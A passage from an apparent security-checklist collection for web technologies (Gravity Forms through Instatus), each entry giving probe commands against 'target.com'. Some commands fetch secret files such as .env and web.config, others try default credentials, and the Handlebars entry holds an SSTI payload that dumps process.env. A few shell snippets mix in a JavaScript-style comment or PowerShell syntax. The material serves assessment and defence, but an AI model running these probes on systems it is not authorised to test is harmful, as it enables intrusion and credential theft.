Gravity Forms REST API may expose form entries, field data, and uploaded files without proper authentication.

**Commands:**
```bash
curl -s http://target.com/wp-json/gf/v2/entries
curl -s http://target.com/wp-json/gf/v2/forms
```

**References:**
- https://docs.gravityforms.com/rest-api-v2/

### Check Gravity Forms for stored XSS in form submissions
<!-- id: gravity-3 | severity: medium | tags: gravity-forms, xss, submissions -->
Admin users viewing form entries may be vulnerable to stored XSS if submitted data is not sanitized before display.

**References:**
- https://docs.gravityforms.com/security-white-paper/

---

## Gridsome
<!-- id: gridsome | icon: 🛠️ | color: #e06c75 -->
Security checklists for Gridsome Vue.js static site generator.

### Check Gridsome for GraphQL endpoint exposure
<!-- id: gridsome-1 | severity: high | tags: gridsome, graphql, info-disclosure -->
Gridsome exposes a GraphQL API at /___graphql in development. Ensure it's disabled in production builds.

**Commands:**
```bash
curl -s http://target.com/___graphql
```

**References:**
- https://gridsome.org/docs/security/

### Check Gridsome for source map exposure
<!-- id: gridsome-2 | severity: medium | tags: gridsome, source-map, info-disclosure -->
Gridsome production builds may include source maps exposing Vue component source code.

**Commands:**
```bash
curl -s http://target.com/assets/js/*.js.map | head -20
```

**References:**
- https://gridsome.org/docs/assets-and-files/

---

## Grunt
<!-- id: grunt | icon: 🛠️ | color: #e06c75 -->
Security checklists for Grunt JavaScript task runner.

### Check Grunt for exposed build artifacts
<!-- id: grunt-1 | severity: medium | tags: grunt, build, artifacts -->
Grunt build artifacts may contain source maps, temporary files, and configuration data not intended for production.

**Commands:**
```bash
curl -s http://target.com/Gruntfile.js
curl -s http://target.com/gruntfile.js
```

**References:**
- https://gruntjs.com/

---

## Gulp
<!-- id: gulp | icon: 🛠️ | color: #e06c75 -->
Security checklists for Gulp streaming build system.

### Check Gulp for exposed gulpfile
<!-- id: gulp-1 | severity: medium | tags: gulp, build, config -->
Exposed gulpfile.js may reveal build pipeline structure, paths, and plugin configuration.

**Commands:**
```bash
curl -s http://target.com/gulpfile.js
curl -s http://target.com/gulpfile.babel.js
```

**References:**
- https://gulpjs.com/

---

## Gutentor
<!-- id: gutentor | icon: 🛠️ | color: #e06c75 -->
Security checklists for Gutentor WordPress block editor plugin.

### Check Gutentor for stored XSS via block attributes
<!-- id: gutentor-1 | severity: high | tags: gutentor, wordpress, xss, gutenberg -->
Gutentor blocks may allow injected JavaScript via block attribute fields if input sanitization is insufficient.

**References:**
- https://www.gutentor.com/

---

## Grav CMS
<!-- id: grav | icon: 🛠️ | color: #e06c75 -->
Security checklists for Grav flat-file CMS.

### Check Grav for exposed admin panel
<!-- id: grav-1 | severity: high | tags: grav, cms, admin, file-upload -->
Grav admin panel with default credentials allows PHP file upload and full site takeover.

**Commands:**
```bash
curl -s http://target.com/admin
```

**References:**
- https://learn.getgrav.org/17/security

### Check Grav for exposed user YAML files
<!-- id: grav-2 | severity: high | tags: grav, yaml, info-disclosure, credentials -->
Grav stores user accounts in YAML files that may be accessible via directory traversal.

**Commands:**
```bash
curl -s http://target.com/user/accounts/admin.yaml
curl -s http://target.com/user/config/security.yaml
```

**References:**
- https://learn.getgrav.org/17/security

---

## Gitiles
<!-- id: gitiles | icon: 🛠️ | color: #e06c75 -->
Security checklists for Gitiles (Android Open Source Project Git browser).

### Check Gitiles for unauthenticated repository browsing
<!-- id: gitiles-1 | severity: high | tags: gitiles, git, source-code, info-disclosure -->
Gitiles instances may expose private repositories, commits, and source code without authentication.

**Commands:**
```bash
curl -s http://target.com/gitiles/
curl -s http://target.com/gitiles/PROJECT/+/refs/heads/master/
```

**References:**
- https://gerrit.googlesource.com/gitiles/

---

## GoCache
<!-- id: gocache | icon: 🛠️ | color: #e06c75 -->
Security checklists for GoCache CDN and caching service.

### Check GoCache for origin IP exposure
<!-- id: gocache-1 | severity: high | tags: gocache, cdn, origin-exposure -->
GoCache-concealed origin servers may be discovered via historical DNS records or certificate transparency logs, bypassing DDoS protection.

**Commands:**
```bash
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u
```

**References:**
- https://gocache.com.br/en/features

---

## GoJS
<!-- id: gojs | icon: 🛠️ | color: #e06c75 -->
Security checklists for GoJS JavaScript diagramming library.

### Check GoJS for exposed diagram data in page source
<!-- id: gojs-1 | severity: low | tags: gojs, diagrams, info-disclosure -->
GoJS diagrams serialized to JSON may be embedded in the page source, leaking internal process flows or architecture data.

**Commands:**
```bash
curl -s http://target.com | grep -i "gojs\|go\.js\|diagram"
```

**References:**
- https://gojs.net/

---

## GoKwik
<!-- id: gokwik | icon: 🛠️ | color: #e06c75 -->
Security checklists for GoKwik e-commerce checkout platform.

### Check GoKwik for exposed API keys
<!-- id: gokwik-1 | severity: high | tags: gokwik, ecommerce, api-key, checkout -->
GoKwik API keys embedded in client-side JavaScript may allow unauthorized access to checkout flows and customer payment data.

**Commands:**
```bash
curl -s http://target.com | grep -i "gokwik"
```

**References:**
- https://gokwik.co/

---

## GoSquared
<!-- id: gosquared | icon: 🛠️ | color: #e06c75 -->
Security checklists for GoSquared website analytics platform.

### Check GoSquared for exposed dashboard tokens
<!-- id: gosquared-1 | severity: medium | tags: gosquared, analytics, token-exposure -->
GoSquared site tokens exposed in page source may allow unauthorized access to analytics data.

**Commands:**
```bash
curl -s http://target.com | grep -i "gosquared"
```

**References:**
- https://www.gosquared.com/security/

---

## GoStats
<!-- id: gostats | icon: 🛠️ | color: #e06c75 -->
Security checklists for GoStats web analytics.

### Check GoStats for exposed tracking code with site IDs
<!-- id: gostats-1 | severity: low | tags: gostats, analytics, tracking -->
GoStats site IDs in the tracking code may reveal traffic statistics if the profile is set to public.

**Commands:**
```bash
curl -s http://target.com | grep -i "gostats"
```

**References:**
- https://gostats.com/

---

## Handlebars
<!-- id: handlebars | icon: 🛠️ | color: #e06c75 -->
Security checklists for Handlebars JavaScript templating engine.

### Check Handlebars for Server-Side Template Injection (SSTI)
<!-- id: handlebars-1 | severity: critical | tags: handlebars, ssti, rce -->
Handlebars templates with unsanitized user input may allow Server-Side Template Injection, leading to remote code execution.

**Commands:**
```bash
// Test SSTI with Handlebars expressions
curl -s 'http://target.com/?template={{7*7}}'
curl -s 'http://target.com/?name={{constructor.constructor("return process.env")()}}'
```

**References:**
- https://handlebarsjs.com/guide/security.html

### Check Handlebars for XSS via raw HTML rendering
<!-- id: handlebars-2 | severity: high | tags: handlebars, xss, client-side -->
Handlebars renders raw HTML with triple-stash {{{expr}}}, which can lead to XSS if used with unsanitized user data.

**References:**
- https://handlebarsjs.com/guide/#html-escaping

---

## Hammer.js
<!-- id: hammerjs | icon: 🛠️ | color: #e06c75 -->
Security checklists for Hammer.js touch gesture library.

### Check Hammer.js for outdated version vulnerabilities
<!-- id: hammerjs-1 | severity: low | tags: hammerjs, javascript-library, vuln-scan -->
Outdated Hammer.js versions may have known vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "hammer"
```

**References:**
- https://hammerjs.github.io/

---

## Harbor
<!-- id: harbor | icon: 🛠️ | color: #e06c75 -->
Security checklists for Harbor container image registry.

### Check Harbor for exposed registry API
<!-- id: harbor-1 | severity: critical | tags: harbor, container, registry, api -->
Harbor registries with public API access allow anyone to pull container images, revealing application internals and secrets.

**Commands:**
```bash
curl -s "http://target.com/api/v2.0/projects"
curl -s "http://target.com/v2/_catalog"
```

**References:**
- https://goharbor.io/docs/2.0.0/security/

### Check Harbor for default admin credentials
<!-- id: harbor-2 | severity: critical | tags: harbor, default-creds, admin -->
Harbor default admin credentials (admin/Harbor12345) grant full access to all projects and image repositories.

**Commands:**
```bash
curl -s -u admin:Harbor12345 "http://target.com/api/v2.0/users"
```

**References:**
- https://goharbor.io/docs/2.0.0/install-config/configure-admin-user/

---

## Hashnode
<!-- id: hashnode | icon: 🛠️ | color: #e06c75 -->
Security checklists for Hashnode blogging platform.

### Check Hashnode for custom domain takeover
<!-- id: hashnode-1 | severity: high | tags: hashnode, subdomain-takeover, dns -->
When a Hashnode custom domain's DNS records are not updated after blog deletion, the domain is vulnerable to takeover.

**References:**
- https://hashnode.com/security

---

## Haskell
<!-- id: haskell | icon: 🛠️ | color: #e06c75 -->
Security checklists for Haskell web applications.

### Check Haskell for exposed debug endpoints
<!-- id: haskell-1 | severity: high | tags: haskell, debug, info-disclosure -->
Haskell web applications (Yesod, WAI, Warp) running in development mode expose detailed error pages.

**Commands:**
```bash
curl -s -X POST http://target.com/ -d "trigger error"
```

**References:**
- https://www.yesodweb.com/book/security

---

## Hasura
<!-- id: hasura | icon: 🛠️ | color: #e06c75 -->
Security checklists for Hasura GraphQL engine.

### Check Hasura for unauthenticated GraphQL access
<!-- id: hasura-1 | severity: critical | tags: hasura, graphql, unauth, database -->
Hasura without admin secret or auth webhook exposes full database access via GraphQL queries and mutations.

**Commands:**
```bash
curl -s http://target.com:8080/v1/graphql -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name } } }"}'
curl -s http://target.com:8080/v1/metadata
```

**References:**
- https://hasura.io/docs/latest/security/

### Check Hasura for exposed console/API
<!-- id: hasura-2 | severity: high | tags: hasura, console, info-disclosure -->
Hasura console (/console) allows interactive database exploration and schema modification.

**Commands:**
```bash
curl -s http://target.com:8080/console
```

**References:**
- https://hasura.io/docs/latest/security/

### Check Hasura for metadata API without admin secret
<!-- id: hasura-3 | severity: critical | tags: hasura, metadata, unauthorized-access -->
Hasura metadata API allows schema changes unless protected by admin secret.

**Commands:**
```bash
curl -s http://target.com:8080/v1/metadata -H "Content-Type: application/json" -d '{"type":"export_metadata","args":{}}'
```

**References:**
- https://hasura.io/docs/latest/security/

---

## Headless UI
<!-- id: headless-ui | icon: 🛠️ | color: #e06c75 -->
Security checklists for Headless UI unstyled component library.

### Check Headless UI for XSS via component props
<!-- id: headless-ui-1 | severity: medium | tags: headless-ui, react, xss -->
Headless UI components rendering dangerouslySetInnerHTML from user input may introduce XSS.

**References:**
- https://headlessui.com/

---

## Headroom.js
<!-- id: headroom | icon: 🛠️ | color: #e06c75 -->
Security checklists for Headroom.js header library.

### Check Headroom.js for outdated version
<!-- id: headroom-1 | severity: low | tags: headroom, javascript-library, outdated -->
Outdated Headroom.js versions may have known DOM manipulation vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "headroom"
```

**References:**
- https://headroom.js.org/

---

## Heap
<!-- id: heap | icon: 🛠️ | color: #e06c75 -->
Security checklists for Heap product analytics.

### Check Heap for exposed environment ID
<!-- id: heap-1 | severity: low | tags: heap, analytics, id-exposure -->
Heap environment IDs in client-side JavaScript may allow unauthorized data injection.

**Commands:**
```bash
curl -s http://target.com | grep -i "heap"
```

**References:**
- https://heap.io/security

---

## Hello Bar
<!-- id: hello-bar | icon: 🛠️ | color: #e06c75 -->
Security checklists for Hello Bar lead capture tool.

### Check Hello Bar for exposed API keys
<!-- id: hello-bar-1 | severity: low | tags: hello-bar, api-key, exposure -->
Hello Bar API keys embedded in page JavaScript may be scraped for unauthorized modifications.

**Commands:**
```bash
curl -s http://target.com | grep -i "hellobar"
```

**References:**
- https://www.hellobar.com/

---

## Help Scout
<!-- id: help-scout | icon: 🛠️ | color: #e06c75 -->
Security checklists for Help Scout customer support platform.

### Check Help Scout for exposed Beacon API keys
<!-- id: help-scout-1 | severity: medium | tags: help-scout, beacon, api-key -->
Help Scout Beacon keys in client-side JavaScript allow reading and sending messages as a user.

**Commands:**
```bash
curl -s http://target.com | grep -i "beacon\|helpscout"
```

**References:**
- https://developer.helpscout.com/beacon-2/web/

---

## Heroku
<!-- id: heroku | icon: 🛠️ | color: #e06c75 -->
Security checklists for Heroku cloud platform.

### Check Heroku for exposed environment variables
<!-- id: heroku-1 | severity: high | tags: heroku, env-vars, secrets -->
Heroku dyno metadata and environment variables may be exposed through debug endpoints or error pages.

**Commands:**
```bash
curl -s http://target.com/.env
curl -s http://target.com/Procfile
```

**References:**
- https://devcenter.heroku.com/articles/security

### Check Heroku for exposed app metadata
<!-- id: heroku-2 | severity: medium | tags: heroku, metadata, info-disclosure -->
Heroku releases and deployment metadata may be visible via HTTP headers.

**Commands:**
```bash
curl -sI http://target.com | grep -i "heroku\|x-powered-by"
```

**References:**
- https://devcenter.heroku.com/articles/security

---

## Hesk
<!-- id: hesk | icon: 🛠️ | color: #e06c75 -->
Security checklists for Hesk PHP help desk software.

### Check Hesk for default admin credentials
<!-- id: hesk-1 | severity: critical | tags: hesk, helpdesk, default-creds, admin -->
Hesk default admin panel (/admin) with default credentials allows full ticket and user management.

**Commands:**
```bash
curl -s http://target.com/admin/
```

**References:**
- https://www.hesk.com/

### Check Hesk for exposed ticket data
<!-- id: hesk-2 | severity: high | tags: hesk, tickets, data-exposure -->
Hesk ticket data may be exposed through predictable ticket IDs or directory listing.

**References:**
- https://www.hesk.com/

---

## Hetzner
<!-- id: hetzner | icon: 🛠️ | color: #e06c75 -->
Security checklists for Hetzner cloud dedicated server hosting.

### Check Hetzner for exposed Cloud API tokens
<!-- id: hetzner-1 | severity: critical | tags: hetzner, api, cloud, credentials -->
Exposed Hetzner Cloud API tokens allow full control over servers, networks, and firewalls.

**References:**
- https://docs.hetzner.com/cloud/api/

---

## Hexo
<!-- id: hexo | icon: 🛠️ | color: #e06c75 -->
Security checklists for Hexo static site generator.

### Check Hexo for source map exposure
<!-- id: hexo-1 | severity: medium | tags: hexo, source-map, info-disclosure -->
Hexo may generate source maps exposing the original template and configuration structure.

**Commands:**
```bash
curl -s http://target.com | grep -i "hexo\|_config.yml"
```

**References:**
- https://hexo.io/docs/

### Check Hexo for exposed configuration files
<!-- id: hexo-2 | severity: high | tags: hexo, config, info-disclosure -->
`_config.yml` or `_config.json` files may be accessible directly, exposing deployment settings and API keys.

**Commands:**
```bash
curl -s http://target.com/_config.yml
```

**References:**
- https://hexo.io/docs/configuration

---

## Hiawatha
<!-- id: hiawatha | icon: 🛠️ | color: #e06c75 -->
Security checklists for Hiawatha web server.

### Check Hiawatha for server info disclosure
<!-- id: hiawatha-1 | severity: low | tags: hiawatha, webserver, info-disclosure -->
Hiawatha banners may disclose version information used to target known vulnerabilities.

**Commands:**
```bash
curl -sI http://target.com | grep -i "server\|hiawatha"
```

**References:**
- https://www.hiawatha-webserver.org/

---

## Highcharts
<!-- id: highcharts | icon: 🛠️ | color: #e06c75 -->
Security checklists for Highcharts JavaScript charting library.

### Check Highcharts for XSS via chart data
<!-- id: highcharts-1 | severity: medium | tags: highcharts, xss, javascript-library -->
Highcharts HTML labels and formatter functions may execute unsanitized input as HTML leading to XSS.

**Commands:**
```bash
curl -s http://target.com | grep -i "highcharts"
```

**References:**
- https://www.highcharts.com/docs/chart-concepts/security

---

## Highlight.js
<!-- id: highlightjs | icon: 🛠️ | color: #e06c75 -->
Security checklists for Highlight.js syntax highlighting library.

### Check Highlight.js for XSS via crafted code blocks
<!-- id: highlightjs-1 | severity: medium | tags: highlightjs, xss, syntax-highlighting -->
Highlight.js renders HTML in code blocks; crafted input with autoescape disabled can lead to XSS.

**Commands:**
```bash
curl -s http://target.com | grep -i "highlight"
```

**References:**
- https://highlightjs.org/security/

---

## Histats
<!-- id: histats | icon: 🛠️ | color: #e06c75 -->
Security checklists for Histats web analytics.

### Check Histats for exposed tracker IDs
<!-- id: histats-1 | severity: low | tags: histats, analytics, tracking -->
Histats tracker IDs in the page source may expose traffic statistics publicly.

**Commands:**
```bash
curl -s http://target.com | grep -i "histats"
```

**References:**
- https://histats.com/

---

## Home Assistant
<!-- id: home-assistant | icon: 🛠️ | color: #e06c75 -->
Security checklists for Home Assistant home automation platform.

### Check Home Assistant for exposed API without authentication
<!-- id: home-assistant-1 | severity: critical | tags: home-assistant, iot, api, unauth -->
Home Assistant API exposed to the internet without authentication grants access to all smart home sensors and controls.

**Commands:**
```bash
curl -s http://target.com:8123/api/
curl -s http://target.com:8123/api/states
```

**References:**
- https://www.home-assistant.io/docs/authentication/

### Check Home Assistant for exposed websocket
<!-- id: home-assistant-2 | severity: high | tags: home-assistant, websocket, api -->
Home Assistant WebSocket API may be accessible without authentication, allowing event subscriptions and state control.

**Commands:**
```bash
curl -s http://target.com:8123/api/websocket
```

**References:**
- https://www.home-assistant.io/docs/authentication/

---

## Hostinger
<!-- id: hostinger | icon: 🛠️ | color: #e06c75 -->
Security checklists for Hostinger web hosting platform.

### Check Hostinger for exposed hosting panel
<!-- id: hostinger-1 | severity: high | tags: hostinger, hosting, control-panel -->
Hostinger control panels (hpanel) accessible from the internet can be brute-forced.

**Commands:**
```bash
curl -s http://target.com:2083/
```

**References:**
- https://www.hostinger.com/security

---

## Hostgator
<!-- id: hostgator | icon: 🛠️ | color: #e06c75 -->
Security checklists for Hostgator web hosting.

### Check Hostgator for exposed cPanel
<!-- id: hostgator-1 | severity: high | tags: hostgator, hosting, cpanel -->
Hostgator cPanel endpoints exposed to the internet can be brute-forced.

**Commands:**
```bash
curl -s http://target.com:2083/
```

**References:**
- https://www.hostgator.com/security

---

## Hotjar
<!-- id: hotjar | icon: 🛠️ | color: #e06c75 -->
Security checklists for Hotjar session recording and analytics.

### Check Hotjar for exposed site ID
<!-- id: hotjar-1 | severity: low | tags: hotjar, analytics, session-recording -->
Hotjar site IDs exposed in client-side JavaScript allow anyone to view recordings of user sessions.

**Commands:**
```bash
curl -s http://target.com | grep -i "hotjar\|hj-"
```

**References:**
- https://www.hotjar.com/security/

---

## HP iLO
<!-- id: hp-ilo | icon: 🛠️ | color: #e06c75 -->
Security checklists for HP Integrated Lights-Out (iLO) management.

### Check HP iLO for default credentials
<!-- id: hp-ilo-1 | severity: critical | tags: ilo, hardware, default-creds, remote-management -->
HP iLO with default credentials (Administrator/password) grants full remote server management including virtual console.

**Commands:**
```bash
curl -s -u Administrator:password "http://target.com/cgi/login"
nmap -p 22,23,80,443,17988,17990 target.com --script ilo-info
```

**References:**
- https://support.hpe.com/hpesc/public/docDisplay?docId=c04715441

### Check HP iLO for exposed web interface
<!-- id: hp-ilo-2 | severity: high | tags: ilo, hardware, web-interface -->
HP iLO web interface exposed to the internet allows brute-force and known CVE exploitation.

**Commands:**
```bash
curl -sI http://target.com/ | grep -i "ilo\|hp"
```

**References:**
- https://support.hpe.com/hpesc/public/docDisplay?docId=c04715441

---

## HSTS
<!-- id: hsts | icon: 🛠️ | color: #e06c75 -->
Security checklists for HTTP Strict Transport Security headers.

### Check HSTS for missing or weak configuration
<!-- id: hsts-1 | severity: high | tags: hsts, ssl-tls, web-security -->
Missing HSTS headers leave users vulnerable to SSL stripping and man-in-the-middle attacks.

**Commands:**
```bash
curl -sI http://target.com | grep -i "strict-transport-security"
curl -sI https://target.com | grep -i "strict-transport-security"
```

**References:**
- https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html

### Check HSTS for insufficient max-age or missing includeSubDomains
<!-- id: hsts-2 | severity: medium | tags: hsts, configuration, ssl-tls -->
HSTS with low max-age or missing includeSubDomains flag reduces protection against downgrade attacks.

**Commands:**
```bash
curl -sI https://target.com | Select-String "strict-transport-security"
```

**References:**
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security

---

## Htmx
<!-- id: htmx | icon: 🛠️ | color: #e06c75 -->
Security checklists for Htmx AJAX library.

### Check Htmx for XSS via hx-vals or hx-headers
<!-- id: htmx-1 | severity: high | tags: htmx, xss, ajax -->
Htmx hx-vals with JSON from unsanitized user input can lead to XSS if the server reflects values improperly.

**Commands:**
```bash
curl -s http://target.com | grep -i "htmx\|hx-"
```

**References:**
- https://htmx.org/docs/#security

### Check Htmx for CSRF token validation
<!-- id: htmx-2 | severity: high | tags: htmx, csrf, ajax -->
Htmx requests bypass traditional form-based CSRF protection; ensure proper CSRF token validation on AJAX endpoints.

**References:**
- https://htmx.org/docs/#security

---

## HubSpot
<!-- id: hubspot | icon: 🛠️ | color: #e06c75 -->
Security checklists for HubSpot CRM platform.

### Check HubSpot for exposed API keys and OAuth tokens
<!-- id: hubspot-1 | severity: critical | tags: hubspot, api-key, crm, data-exposure -->
HubSpot API keys or OAuth tokens in client-side JavaScript expose CRM data, contacts, and email sequences.

**Commands:**
```bash
curl -s http://target.com | grep -i "hubspot\|hs-"
```

**References:**
- https://developers.hubspot.com/docs/api/security

### Check HubSpot for exposed forms portal ID
<!-- id: hubspot-2 | severity: low | tags: hubspot, forms, portal-id -->
HubSpot portal ID in forms allows third parties to submit data or scrape form configurations.

**Commands:**
```bash
curl -s http://target.com | grep -i "hubspot\|hbspt"
```

**References:**
- https://developers.hubspot.com/docs/api/security

---

## Hugo
<!-- id: hugo | icon: 🛠️ | color: #e06c75 -->
Security checklists for Hugo static site generator.

### Check Hugo for exposed configuration files
<!-- id: hugo-1 | severity: high | tags: hugo, config, info-disclosure -->
Hugo configuration files (config.toml, config.yaml, config.json) may be exposed, revealing deployment settings and API keys.

**Commands:**
```bash
curl -s http://target.com/config.toml
curl -s http://target.com/config.yaml
```

**References:**
- https://gohugo.io/getting-started/configuration/

### Check Hugo for source map exposure
<!-- id: hugo-2 | severity: medium | tags: hugo, source-map, info-disclosure -->
Hugo production builds may include source maps that reveal template structure.

**Commands:**
```bash
curl -s http://target.com | grep -i "hugo\|\.map"
```

**References:**
- https://gohugo.io/

---

## HumHub
<!-- id: humhub | icon: 🛠️ | color: #e06c75 -->
Security checklists for HumHub social network kit.

### Check HumHub for exposed admin panel
<!-- id: humhub-1 | severity: high | tags: humhub, social-network, admin, info-disclosure -->
HumHub admin panel accessible without authentication grants access to user data and configuration.

**Commands:**
```bash
curl -s http://target.com/admin
```

**References:**
- https://www.humhub.com/en/security

---

## IBM HTTP Server (IHS)
<!-- id: ibm-http-server | icon: 🛠️ | color: #e06c75 -->
Security checklists for IBM HTTP Server.

### Check IHS for server info disclosure
<!-- id: ibm-http-1 | severity: low | tags: ibm-http, webserver, info-disclosure -->
IHS banners may disclose version information used to target known vulnerabilities.

**Commands:**
```bash
curl -sI http://target.com | grep -i "server\|ibm"
```

**References:**
- https://www.ibm.com/docs/en/ibm-http-server

---

## IBM DataPower
<!-- id: ibm-datapower | icon: 🛠️ | color: #e06c75 -->
Security checklists for IBM DataPower gateway.

### Check DataPower for default credentials
<!-- id: ibm-datapower-1 | severity: critical | tags: datapower, gateway, default-creds -->
IBM DataPower with default credentials (admin/admin) grants full access to gateway configuration and backend services.

**Commands:**
```bash
curl -s -u admin:admin "http://target.com:9090/"
```

**References:**
- https://www.ibm.com/docs/en/datapower

---

## IconScout
<!-- id: iconscout | icon: 🛠️ | color: #e06c75 -->
Security checklists for IconScout icon and illustration platform.

### Check IconScout for exposed API keys
<!-- id: iconscout-1 | severity: low | tags: iconscout, api-key, icons -->
IconScout API keys embedded in client-side JavaScript may allow unauthorized access to icon libraries.

**Commands:**
```bash
curl -s http://target.com | grep -i "iconscout"
```

**References:**
- https://iconscout.com/

---

## IIS (Internet Information Services)
<!-- id: iis | icon: 🛠️ | color: #e06c75 -->
Security checklists for Microsoft IIS web server.

### Check IIS for directory listing
<!-- id: iis-1 | severity: high | tags: iis, webserver, directory-listing -->
IIS default configurations may enable directory browsing, exposing application files and backups.

**Commands:**
```bash
curl -s http://target.com/
curl -s http://target.com/bin/
```

**References:**
- https://learn.microsoft.com/en-us/iis/

### Check IIS for exposed web.config
<!-- id: iis-2 | severity: high | tags: iis, web-config, info-disclosure -->
IIS web.config files may contain connection strings, app secrets, and configuration details if not properly protected.

**Commands:**
```bash
curl -s http://target.com/web.config
curl -s http://target.com/web.config.bak
```

**References:**
- https://learn.microsoft.com/en-us/iis/

### Check IIS for HTTP method tampering
<!-- id: iis-3 | severity: medium | tags: iis, verb-tampering, methods -->
IIS may allow dangerous HTTP methods (PUT, DELETE, TRACE) that can lead to file upload or XSS.

**Commands:**
```bash
curl -X OPTIONS -sI http://target.com | grep -i "allow"
```

**References:**
- https://learn.microsoft.com/en-us/iis/

---

## Ilias
<!-- id: ilias | icon: 🛠️ | color: #e06c75 -->
Security checklists for ILIAS learning management system.

### Check ILIAS for SQL injection vulnerabilities
<!-- id: ilias-1 | severity: critical | tags: ilias, lms, sqli, php -->
ILIAS' extensive parameter handling in PHP may be vulnerable to SQL injection through unsanitized GET/POST parameters.

**References:**
- https://www.ilias.de/docu/goto_docu_file_2988_download.html

---

## ImageEngine
<!-- id: imageengine | icon: 🛠️ | color: #e06c75 -->
Security checklists for ImageEngine image CDN and optimization.

### Check ImageEngine for origin URL exposure
<!-- id: imageengine-1 | severity: medium | tags: imageengine, cdn, origin-exposure -->
ImageEngine may expose the original origin server URL in image URLs or headers.

**Commands:**
```bash
curl -s http://target.com | grep -i "imageengine\|imgeng"
```

**References:**
- https://imageengine.io/

---

## ImageKit
<!-- id: imagekit | icon: 🛠️ | color: #e06c75 -->
Security checklists for ImageKit image optimization CDN.

### Check ImageKit for exposed private API keys
<!-- id: imagekit-1 | severity: high | tags: imagekit, cdn, api-key -->
ImageKit private API keys exposed in client-side code allow unauthorized image management and uploads.

**Commands:**
```bash
curl -s http://target.com | grep -i "imagekit\|ik-"
```

**References:**
- https://imagekit.io/docs/api-reference

---

## Imgix
<!-- id: imgix | icon: 🛠️ | color: #e06c75 -->
Security checklists for Imgix image processing CDN.

### Check Imgix for source URL exposure
<!-- id: imgix-1 | severity: low | tags: imgix, cdn, source-exposure -->
Imgix image URLs may expose the underlying source server URL if signed URLs are not properly configured.

**Commands:**
```bash
curl -s http://target.com | grep -i "imgix"
```

**References:**
- https://docs.imgix.com/apis/security

---

## Impact
<!-- id: impact | icon: 🛠️ | color: #e06c75 -->
Security checklists for Impact affiliate marketing platform.

### Check Impact for exposed API credentials
<!-- id: impact-1 | severity: medium | tags: impact, affiliate, api-key -->
Impact API credentials embedded in JavaScript may allow unauthorized access to affiliate data.

**Commands:**
```bash
curl -s http://target.com | grep -i "impact"
```

**References:**
- https://impact.com/

---

## Imperva
<!-- id: imperva | icon: 🛠️ | color: #e06c75 -->
Security checklists for Imperva WAF and security platform.

### Check Imperva for origin IP exposure
<!-- id: imperva-1 | severity: high | tags: imperva, waf, origin-exposure, cdn -->
Imperva-concealed origin servers may be discovered via historical DNS records or certificate transparency logs.

**Commands:**
```bash
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u
```

**References:**
- https://docs.imperva.com/bundle/cloud-application-security

### Check Imperva for WAF bypass
<!-- id: imperva-2 | severity: high | tags: imperva, waf, bypass -->
Imperva WAF rules may be bypassed using encoding tricks, HTTP parameter pollution, or known evasion techniques.

**References:**
- https://docs.imperva.com/bundle/cloud-application-security

---

## Incapsula
<!-- id: incapsula | icon: 🛠️ | color: #e06c75 -->
Security checklists for Incapsula (Imperva) WAF and CDN.

### Check Incapsula for origin IP exposure
<!-- id: incapsula-1 | severity: high | tags: incapsula, waf, origin-exposure, cdn -->
Incapsula-concealed origin IPs may be found through CloudFlair-like techniques using Cloudflare or historical DNS.

**Commands:**
```bash
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u
```

**References:**
- https://docs.imperva.com/bundle/cloud-application-security

---

## Indeed
<!-- id: indeed | icon: 🛠️ | color: #e06c75 -->
Security checklists for Indeed job platform.

### Check Indeed for exposed employer API keys
<!-- id: indeed-1 | severity: medium | tags: indeed, api-key, jobs -->
Indeed publisher API keys embedded in page JavaScript may be scraped for unauthorized job posting data access.

**Commands:**
```bash
curl -s http://target.com | grep -i "indeed"
```

**References:**
- https://www.indeed.com/publisher

---

## Inertia.js
<!-- id: inertiajs | icon: 🛠️ | color: #e06c75 -->
Security checklists for Inertia.js single-page app adapter.

### Check Inertia.js for server data exposure
<!-- id: inertiajs-1 | severity: high | tags: inertiajs, spa, data-exposure -->
Inertia.js shares all server-side props to the client. Sensitive data not properly filtered may be exposed in page responses.

**Commands:**
```bash
curl -s http://target.com -H "X-Inertia: true" | jq '.'
```

**References:**
- https://inertiajs.com/security

---

## Infogram
<!-- id: infogram | icon: 🛠️ | color: #e06c75 -->
Security checklists for Infogram data visualization platform.

### Check Infogram for exposed embed tokens
<!-- id: infogram-1 | severity: low | tags: infogram, embed, tokens -->
Infogram embed tokens may expose private charts or dashboards if not properly restricted.

**Commands:**
```bash
curl -s http://target.com | grep -i "infogram"
```

**References:**
- https://infogram.com/

---

## Infomaniak
<!-- id: infomaniak | icon: 🛠️ | color: #e06c75 -->
Security checklists for Infomaniak hosting and cloud services.

### Check Infomaniak for exposed control panel
<!-- id: infomaniak-1 | severity: high | tags: infomaniak, hosting, control-panel -->
Infomaniak control panels exposed to the internet may be vulnerable to credential brute-forcing.

**References:**
- https://www.infomaniak.com/en/security

---

## Inspectlet
<!-- id: inspectlet | icon: 🛠️ | color: #e06c75 -->
Security checklists for Inspectlet session recording analytics.

### Check Inspectlet for exposed tracker ID
<!-- id: inspectlet-1 | severity: low | tags: inspectlet, analytics, session-recording -->
Inspectlet site IDs in client-side JavaScript may allow third parties to view session recordings.

**Commands:**
```bash
curl -s http://target.com | grep -i "inspectlet"
```

**References:**
- https://www.inspectlet.com/

---

## Instana
<!-- id: instana | icon: 🛠️ | color: #e06c75 -->
Security checklists for Instana APM platform.

### Check Instana for exposed agent endpoint
<!-- id: instana-1 | severity: high | tags: instana, apm, agent, info-disclosure -->
Instana agent endpoints on the internet may expose application performance data and infrastructure details.

**References:**
- https://www.ibm.com/docs/en/instana-observability

---

## Instapage
<!-- id: instapage | icon: 🛠️ | color: #e06c75 -->
Security checklists for Instapage landing page builder.

### Check Instapage for exposed page data
<!-- id: instapage-1 | severity: medium | tags: instapage, landing-page, info-disclosure -->
Instapage published pages may expose unpublished variations, A/B test data, or custom domain configuration details.

**Commands:**
```bash
curl -s http://target.com | grep -i "instapage"
```

**References:**
- https://instapage.com/security

---

## Instatus
<!-- id: instatus | icon: 🛠️ | color: #e06c75 -->
